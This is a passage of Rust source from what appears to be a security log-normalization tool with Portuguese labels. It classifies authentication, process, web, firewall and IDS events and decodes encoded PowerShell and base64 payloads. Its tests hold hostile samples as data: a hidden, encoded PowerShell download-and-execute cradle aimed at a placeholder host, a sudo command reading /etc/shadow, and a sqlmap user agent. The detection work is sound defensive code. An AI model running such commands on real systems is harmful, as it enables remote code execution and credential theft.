        if (msg.contains("usermod") || msg.contains("gpasswd")) && msg.contains("to group") {
            return (Some("group_member_add"), Some("success"));
        }
        if msg.contains("delete user '") || msg.contains("userdel") {
            return (Some("account_delete"), Some("success"));
        }
        if msg.contains("password changed for") {
            return (Some("password_change"), Some("success"));
        }
        if msg.contains(" CMD (") {
            return (Some("task_run"), Some("success"));
        }
    }
    // auditd
    if let Some(kind) = field_ci(ev, "type") {
        let res = field_ci(ev, "res")
            .or_else(|| field_ci(ev, "success"))
            .and_then(|v| textual_outcome(&v).or(match v.as_ref() {
                "yes" => Some("success"),
                "no" => Some("failure"),
                _ => None,
            }));
        let action = match kind.as_ref() {
            "USER_LOGIN" | "USER_AUTH" | "USER_ACCT" => Some("logon"),
            "EXECVE" => Some("process_start"),
            "ADD_USER" => Some("account_create"),
            "DEL_USER" => Some("account_delete"),
            "ADD_GROUP" | "GRP_MGMT" => Some("group_member_add"),
            "USER_CHAUTHTOK" => Some("password_change"),
            "CONFIG_CHANGE" => Some("audit_policy_change"),
            _ => None,
        };
        if action.is_some() {
            return (action, res.or(Some("success")));
        }
    }

    // Web requests: status decides the outcome; login endpoints are logons.
    if let Some(status) = value(ev, Role::Status) {
        if let Ok(number) = status.trim().parse::<u16>() {
            if (100..600).contains(&number) {
                let outcome = if number < 400 { "success" } else { "failure" };
                let path = value(ev, Role::Url).map(|u| u.to_ascii_lowercase()).unwrap_or_default();
                let method = ["method", "cs-method", "http.request.method", "request_method"]
                    .iter()
                    .find_map(|k| field_ci(ev, k))
                    .map(|m| m.to_ascii_uppercase())
                    .unwrap_or_default();
                let login_path = ["login", "signin", "sign-in", "logon", "auth", "session", "token", "wp-login", "xmlrpc"]
                    .iter()
                    .any(|n| path.contains(n));
                if login_path && method == "POST" {
                    let outcome = if number == 401 || number == 403 || (number == 200 && path.contains("wp-login")) {
                        "failure"
                    } else if number < 400 {
                        "success"
                    } else {
                        "failure"
                    };
                    return (Some("logon"), Some(outcome));
                }
                return (Some("http_request"), Some(outcome));
            }
        }
    }

    // Firewalls and sensors.
    let upper_code = code.to_ascii_uppercase();
    if matches!(upper_code.as_str(), "DROP" | "REJECT" | "DENY" | "BLOCK") {
        return (Some("network_connection"), Some("failure"));
    }
    if matches!(upper_code.as_str(), "ACCEPT" | "ALLOW" | "PASS") {
        return (Some("network_connection"), Some("success"));
    }
    if let Some(act) = field_ci(ev, "act").or_else(|| field_ci(ev, "action")) {
        if let Some(outcome) = textual_outcome(&act) {
            let network = value(ev, Role::DstPort).is_some() || value(ev, Role::DstIp).is_some();
            let login = message_has(ev, &["login", "Login", "logon", "authentication", "password"]);
            let action = if login { "logon" } else if network { "network_connection" } else { "activity" };
            return (explicit_action_static(explicit_action.as_deref()).or(Some(action)), explicit_outcome.or(Some(outcome)));
        }
    }
    if let Some(event_type) = field_ci(ev, "event_type") {
        // Suricata EVE
        if event_type == "alert" {
            return (Some("ids_alert"), Some("success"));
        }
        if event_type == "dns" {
            return (Some("dns_query"), Some("success"));
        }
        if event_type == "flow" || event_type == "netflow" {
            return (Some("network_connection"), Some("success"));
        }
    }

    // Generic application messages.
    if !msg.is_empty() && msg.len() < 16_384 {
        let lower = msg.to_lowercase();
        let auth = ["login", "logon", "sign-in", "signin", "authenticat", "autentica", "senha", "password", "credencia"]
            .iter()
            .any(|n| lower.contains(n));
        if auth {
            let failed = ["fail", "falh", "invalid", "inválid", "invalida", "denied", "negad", "incorrect", "incorret", "wrong", "errad", "locked", "bloquead"]
                .iter()
                .any(|n| lower.contains(n));
            let ok = ["success", "sucesso", "logged in", "accepted", "bem-sucedid", "autenticado com"]
                .iter()
                .any(|n| lower.contains(n));
            if failed {
                return (Some("logon"), Some("failure"));
            }
            if ok {
                return (Some("logon"), Some("success"));
            }
        }
    }
    (explicit_action_static(explicit_action.as_deref()), explicit_outcome)
}

fn explicit_action_static(value: Option<&str>) -> Option<&'static str> {
    let v = value?.to_ascii_lowercase();
    Some(match v.as_str() {
        a if a.contains("logon") || a.contains("login") || a.contains("authentication") => "logon",
        a if a.contains("logoff") || a.contains("logout") => "logoff",
        a if a.contains("process") && (a.contains("start") || a.contains("creat")) => "process_start",
        a if a.contains("dns") => "dns_query",
        a if a.contains("connection") || a.contains("network") => "network_connection",
        a if a.contains("file") && a.contains("creat") => "file_create",
        a if a.contains("user") && a.contains("creat") => "account_create",
        _ => return None,
    })
}

pub fn action_label(action: &str) -> &'static str {
    match action {
        "logon" => "Autenticação",
        "logoff" => "Encerramento de sessão",
        "logon_explicit" => "Autenticação com credencial explícita",
        "privileged_logon" => "Sessão privilegiada",
        "process_start" => "Início de processo",
        "process_end" => "Fim de processo",
        "service_install" => "Serviço instalado",
        "task_create" => "Tarefa agendada criada",
        "task_delete" => "Tarefa agendada removida",
        "task_update" => "Tarefa agendada alterada",
        "task_run" => "Tarefa agendada executada",
        "audit_policy_change" => "Política de auditoria alterada",
        "account_create" => "Conta criada",
        "account_enable" => "Conta habilitada",
        "account_disable" => "Conta desabilitada",
        "account_delete" => "Conta removida",
        "account_change" => "Conta alterada",
        "account_lockout" => "Conta bloqueada",
        "password_change" => "Senha alterada",
        "group_member_add" => "Membro adicionado a grupo",
        "group_member_remove" => "Membro removido de grupo",
        "kerberos_tgt" => "Ticket Kerberos (TGT)",
        "kerberos_service_ticket" => "Ticket de serviço Kerberos",
        "registry_change" => "Registro alterado",
        "object_access" => "Acesso a objeto",
        "share_access" => "Acesso a compartilhamento",
        "network_connection" => "Conexão de rede",
        "log_clear" => "Registro de auditoria apagado ou desativado",
        "time_change" => "Horário do sistema alterado",
        "script_execution" => "Execução de script",
        "malware_detected" => "Malware detectado",
        "protection_disabled" => "Proteção desativada",
        "privilege_grant" => "Privilégio concedido",
        "credential_create" => "Credencial criada",
        "network_change" => "Regra de rede alterada",
        "secret_access" => "Acesso a segredo",
        "privilege_use" => "Uso de privilégio (sudo)",
        "http_request" => "Requisição HTTP",
        "ids_alert" => "Alerta de IDS",
        "dns_query" => "Consulta DNS",
        "image_load" => "Carga de módulo",
        "remote_thread" => "Thread remota criada",
        "process_access" => "Acesso a processo",
        "file_create" => "Arquivo criado",
        "file_stream" => "Fluxo alternativo de arquivo",
        "file_delete" => "Arquivo removido",
        "process_tampering" => "Adulteração de processo",
        "activity" => "Atividade",
        _ => "Atividade",
    }
}

// ------------------------------------------------------------- bulk

/// All canonical values of an event, computed in one pass over its fields.
#[derive(Default)]
pub struct Extracted<'a> {
    values: [Option<Cow<'a, str>>; 19],
}

fn slot(role: Role) -> usize {
    role as usize
}

impl<'a> Extracted<'a> {
    pub fn get(&self, role: Role) -> Option<&str> {
        self.values[slot(role)].as_deref()
    }
}

pub fn extract(ev: &Event) -> Extracted<'_> {
    let mut out = Extracted::default();
    let table = alias_table();
    let mut priorities = [u8::MAX; 19];
    let mut buffer = [0u8; 96];
    for (key, value) in &ev.fields {
        let Some(lower) = lookup_key(key, &mut buffer) else { continue };
        let Some(&(role, priority)) = table.get(lower) else { continue };
        let index = slot(role);
        if priorities[index] <= priority {
            continue;
        }
        if let Some(text) = scalar(value).filter(|t| usable(t)) {
            priorities[index] = priority;
            out.values[index] = Some(text);
        }
    }
    for role in [Role::SrcIp, Role::DstIp] {
        let index = slot(role);
        if let Some(found) = out.values[index].take() {
            out.values[index] = parse_ip(&found).map(|ip| Cow::Owned(ip.to_string()));
        }
    }
    if let Some(hash) = out.values[slot(Role::Hash)].take() {
        out.values[slot(Role::Hash)] = Some(normalize_hash(hash));
    }
    for role in [Role::User, Role::SrcIp, Role::DstIp, Role::Host, Role::DstPort, Role::CommandLine, Role::Status] {
        if out.values[slot(role)].is_none() {
            out.values[slot(role)] = fallback(ev, role);
        }
    }
    let (action, outcome) = action_outcome(ev);
    out.values[slot(Role::Action)] = action.map(Cow::Borrowed);
    out.values[slot(Role::Outcome)] = outcome.map(Cow::Borrowed);
    out.values[slot(Role::SrcScope)] = out.values[slot(Role::SrcIp)]
        .as_deref()
        .and_then(parse_ip)
        .map(|ip| Cow::Borrowed(ip_scope(ip)));
    out.values[slot(Role::DstScope)] = out.values[slot(Role::DstIp)]
        .as_deref()
        .and_then(parse_ip)
        .map(|ip| Cow::Borrowed(ip_scope(ip)));
    let tool = out
        .values[slot(Role::UserAgent)]
        .as_deref()
        .and_then(tool_in_user_agent)
        .or_else(|| out.values[slot(Role::Process)].as_deref().and_then(tool_in_process))
        .or_else(|| out.values[slot(Role::CommandLine)].as_deref().and_then(tool_in_process));
    out.values[slot(Role::Tool)] = tool.map(|t| Cow::Borrowed(t.name));
    out
}

/// Roles observed in a sample, for the column list. Attributes that every
/// event would derive (scope, action) appear only when their source exists.
pub fn observed_columns<'a>(events: impl Iterator<Item = &'a Event>) -> Vec<String> {
    let mut seen = [false; 19];
    for ev in events {
        let found = extract(ev);
        for info in ROLES {
            if found.get(info.role).is_some() {
                seen[slot(info.role)] = true;
            }
        }
        if seen.iter().all(|s| *s) {
            break;
        }
    }
    ROLES
        .iter()
        .filter(|info| seen[slot(info.role)])
        .map(|info| info.column.to_string())
        .collect()
}

// ------------------------------------------------------------- insights

#[derive(Serialize)]
pub struct EntityValue {
    pub role: String,
    pub column: String,
    pub label: String,
    pub value: String,
    pub scope: Option<String>,
}

#[derive(Serialize)]
pub struct Decoded {
    pub kind: String,
    pub source: String,
    pub text: String,
}

pub fn entity_values(ev: &Event) -> Vec<EntityValue> {
    let found = extract(ev);
    ROLES
        .iter()
        .filter(|info| !matches!(info.role, Role::SrcScope | Role::DstScope))
        .filter_map(|info| {
            let value = found.get(info.role)?;
            let scope = match info.role {
                Role::SrcIp => found.get(Role::SrcScope),
                Role::DstIp => found.get(Role::DstScope),
                _ => None,
            };
            Some(EntityValue {
                role: format!("{:?}", info.role),
                column: info.column.into(),
                label: info.label.into(),
                value: value.chars().take(2000).collect(),
                scope: scope.map(str::to_string),
            })
        })
        .collect()
}

fn printable_ratio(text: &str) -> f64 {
    let total = text.chars().count().max(1);
    let printable = text
        .chars()
        .filter(|c| !c.is_control() || matches!(c, '\n' | '\r' | '\t'))
        .count();
    printable as f64 / total as f64
}

fn decode_base64(candidate: &str) -> Option<Vec<u8>> {
    use base64::Engine;
    let cleaned: String = candidate.chars().filter(|c| !c.is_whitespace()).collect();
    base64::engine::general_purpose::STANDARD
        .decode(cleaned.as_bytes())
        .or_else(|_| base64::engine::general_purpose::STANDARD_NO_PAD.decode(cleaned.trim_end_matches('=').as_bytes()))
        .or_else(|_| base64::engine::general_purpose::URL_SAFE_NO_PAD.decode(cleaned.trim_end_matches('=').as_bytes()))
        .ok()
}

fn utf16le(bytes: &[u8]) -> Option<String> {
    if bytes.len() < 4 || bytes.len() % 2 != 0 {
        return None;
    }
    // PowerShell -EncodedCommand is UTF-16LE: every second byte is usually zero.
    let zeros = bytes.iter().skip(1).step_by(2).filter(|b| **b == 0).count();
    if zeros * 10 < bytes.len() / 2 * 7 {
        return None;
    }
    let units: Vec<u16> = bytes.chunks_exact(2).map(|c| u16::from_le_bytes([c[0], c[1]])).collect();
    String::from_utf16(&units).ok()
}

/// Encoded payloads worth showing decoded: PowerShell -enc and base64 blobs.
pub fn decode_payloads(ev: &Event) -> Vec<Decoded> {
    static ENC: OnceLock<regex::Regex> = OnceLock::new();
    static B64: OnceLock<regex::Regex> = OnceLock::new();
    let enc = ENC.get_or_init(|| {
        regex::Regex::new(r"(?i)(?:^|\s)-e(?:nc(?:odedcommand)?|c)?\s+([A-Za-z0-9+/=]{16,})").unwrap()
    });
    let b64 = B64.get_or_init(|| regex::Regex::new(r"[A-Za-z0-9+/]{40,}={0,2}").unwrap());
    let mut texts: Vec<(String, String)> = vec![("mensagem".into(), ev.message.clone())];
    for (key, value) in &ev.fields {
        if let Value::String(s) = value {
            if s.len() >= 20 && s.len() <= 200_000 {
                texts.push((key.clone(), s.clone()));
            }
        }
    }
    let mut out: Vec<Decoded> = Vec::new();
    let mut seen = std::collections::HashSet::new();
    for (source, text) in &texts {
        for cap in enc.captures_iter(text).take(4) {
            let blob = &cap[1];
            if !seen.insert(blob.to_string()) {
                continue;
            }
            if let Some(decoded) = decode_base64(blob).and_then(|b| utf16le(&b).or_else(|| String::from_utf8(b).ok())) {
                if printable_ratio(&decoded) > 0.9 {
                    out.push(Decoded { kind: "PowerShell codificado".into(), source: source.clone(), text: decoded.chars().take(20_000).collect() });
                }
            }
        }
        for found in b64.find_iter(text).take(6) {
            let blob = found.as_str();
            if !seen.insert(blob.to_string()) {
                continue;
            }
            let Some(bytes) = decode_base64(blob) else { continue };
            let decoded = utf16le(&bytes).or_else(|| String::from_utf8(bytes).ok());
            if let Some(decoded) = decoded.filter(|d| d.len() >= 8 && printable_ratio(d) > 0.95) {
                out.push(Decoded { kind: "Base64".into(), source: source.clone(), text: decoded.chars().take(20_000).collect() });
            }
        }
        if out.len() >= 8 {
            break;
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    fn event(fields: Value) -> Event {
        let mut ev = Event::empty();
        if let Value::Object(map) = fields {
            ev.fields = map;
        }
        ev
    }

    #[test]
    fn aliases_resolve_to_one_role_with_priority() {
        let ev = event(json!({"SubjectUserName": "SYSTEM", "TargetUserName": "alice", "IpAddress": "10.1.2.3", "Computer": "WS01"}));
        assert_eq!(value(&ev, Role::User).as_deref(), Some("alice"));
        assert_eq!(value(&ev, Role::SrcIp).as_deref(), Some("10.1.2.3"));
        assert_eq!(value(&ev, Role::Host).as_deref(), Some("WS01"));
        assert_eq!(value(&ev, Role::SrcScope).as_deref(), Some("privado"));
        let ev = event(json!({"IpAddress": "-", "user": "-"}));
        assert!(value(&ev, Role::SrcIp).is_none());
        assert!(value(&ev, Role::User).is_none());
    }

    #[test]
    fn text_logs_yield_users_addresses_and_outcomes() {
        let mut ev = Event::empty();
        ev.source = "srv".into();
        ev.fields.insert("process".into(), json!("sshd"));
        ev.message = "Failed password for invalid user admin from 45.90.12.3 port 61022 ssh2".into();
        assert_eq!(value(&ev, Role::User).as_deref(), Some("admin"));
        assert_eq!(value(&ev, Role::SrcIp).as_deref(), Some("45.90.12.3"));
        assert_eq!(value(&ev, Role::Host).as_deref(), Some("srv"));
        assert_eq!(action_outcome(&ev), (Some("logon"), Some("failure")));
        assert_eq!(value(&ev, Role::SrcScope).as_deref(), Some("público"));
        ev.message = "Accepted publickey for felip from 192.168.1.50 port 51122 ssh2".into();
        assert_eq!(action_outcome(&ev), (Some("logon"), Some("success")));
        assert_eq!(value(&ev, Role::User).as_deref(), Some("felip"));
        ev.message = "    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/cat /etc/shadow".into();
        assert_eq!(value(&ev, Role::User).as_deref(), Some("alice"));
        assert_eq!(value(&ev, Role::CommandLine).as_deref(), Some("/bin/cat /etc/shadow"));
        assert_eq!(action_outcome(&ev).0, Some("privilege_use"));
        ev.message = "Started Daily apt download activities waiting for connection".into();
        assert!(value(&ev, Role::User).is_none());
    }

    #[test]
    fn windows_codes_map_to_actions_only_for_windows_sources() {
        let mut ev = event(json!({"TargetUserName": "bob", "LogonType": "3"}));
        ev.source = "Microsoft-Windows-Security-Auditing".into();
        ev.code = "4625".into();
        assert_eq!(action_outcome(&ev), (Some("logon"), Some("failure")));
        ev.code = "1102".into();
        assert_eq!(action_outcome(&ev).0, Some("log_clear"));
        let mut app = event(json!({"cliente": "x"}));
        app.source = "api-pagamentos".into();
        app.code = "4625".into();
        assert_eq!(action_outcome(&app).0, None);
        let mut sysmon = event(json!({"Image": "C:\\Windows\\System32\\cmd.exe", "ParentImage": "C:\\inetpub\\w3wp.exe", "Hashes": "SHA1=AB,MD5=CD,SHA256=EF01"}));
        sysmon.source = "Microsoft-Windows-Sysmon".into();
        sysmon.code = "1".into();
        assert_eq!(action_outcome(&sysmon).0, Some("process_start"));
        assert_eq!(value(&sysmon, Role::Hash).as_deref(), Some("EF01"));
        assert_eq!(value(&sysmon, Role::ParentProcess).as_deref(), Some("C:\\inetpub\\w3wp.exe"));
    }

    #[test]
    fn web_requests_classify_logins_and_tools() {
        let mut ev = event(json!({"method": "POST", "path": "/api/login", "agent": "sqlmap/1.7"}));
        ev.source = "192.168.1.11".into();
        ev.code = "401".into();
        assert_eq!(value(&ev, Role::SrcIp).as_deref(), Some("192.168.1.11"));
        assert_eq!(value(&ev, Role::Status).as_deref(), Some("401"));
        assert_eq!(action_outcome(&ev), (Some("logon"), Some("failure")));
        assert_eq!(value(&ev, Role::Tool).as_deref(), Some("sqlmap"));
        let extracted = extract(&ev);
        assert_eq!(extracted.get(Role::Tool), Some("sqlmap"));
        assert_eq!(extracted.get(Role::Outcome), Some("failure"));
    }

    #[test]
    fn encoded_powershell_is_decoded() {
        use base64::Engine;
        let script: Vec<u8> = "IEX (New-Object Net.WebClient).DownloadString('http://x')"
            .encode_utf16()
            .flat_map(|u| u.to_le_bytes())
            .collect();
        let blob = base64::engine::general_purpose::STANDARD.encode(script);
        let mut ev = Event::empty();
        ev.message = format!("powershell.exe -nop -w hidden -enc {blob}");
        let decoded = decode_payloads(&ev);
        assert!(decoded.iter().any(|d| d.text.contains("DownloadString")), "{:?}", decoded.iter().map(|d| &d.text).collect::<Vec<_>>());
    }

    #[test]
    fn ip_scopes() {
        assert_eq!(ip_scope("8.8.8.8".parse().unwrap()), "público");
        assert_eq!(ip_scope("10.0.0.1".parse().unwrap()), "privado");
        assert_eq!(ip_scope("127.0.0.1".parse().unwrap()), "loopback");
        assert_eq!(ip_scope("fe80::1".parse().unwrap()), "link-local");
        assert_eq!(parse_ip("[2001:db8::1]:443").map(|i| i.to_string()), None);
        assert_eq!(parse_ip("10.0.0.1:8080").map(|i| i.to_string()).as_deref(), Some("10.0.0.1"));
    }
}
